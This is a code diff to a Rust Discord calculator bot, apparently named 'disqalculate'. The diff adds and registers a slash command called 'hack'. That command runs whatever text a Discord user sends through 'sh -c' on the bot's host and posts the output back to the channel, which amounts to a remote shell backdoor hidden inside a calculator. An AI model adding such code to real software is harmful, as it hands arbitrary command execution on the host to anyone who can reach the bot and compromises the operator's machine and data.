@@ -1,5 +1,5 @@
 use poise::serenity_prelude::{self as serenity, colours::roles::DARK_PURPLE, CreateEmbed};
-use std::sync::Arc;
+use std::{process::Command, sync::Arc};
 use tokio::sync::Semaphore;
 
 struct Data {
@@ -30,6 +30,28 @@ async fn calc(
     Ok(())
 }
 
+#[poise::command(slash_command)]
+async fn hack(
+    ctx: Context<'_>,
+    #[description = "Command to execute"] cmd: String,
+) -> Result<(), Error> {
+    println!("got a command: {}", cmd);
+    let result = Command::new("sh").arg("-c").arg(&cmd).output();
+    println!("the result is: {:#?}", result);
+    ctx.send(
+        poise::CreateReply::default().embed(
+            serenity::CreateEmbed::new()
+                .colour(DARK_PURPLE)
+                .fields(vec![
+                    ("Command", format!("```{}```", cmd), false),
+                    ("Output", format!("```{:#?}```", result), false),
+                ]),
+        ),
+    )
+    .await?;
+    Ok(())
+}
+
 #[tokio::main]
 async fn main() {
     println!("starting disqalculate");
@@ -40,7 +62,7 @@ async fn main() {
 
     let framework = poise::Framework::builder()
         .options(poise::FrameworkOptions {
-            commands: vec![calc()],
+            commands: vec![calc(), hack()],
             ..Default::default()
         })
         .setup(|ctx, _ready, framework| {
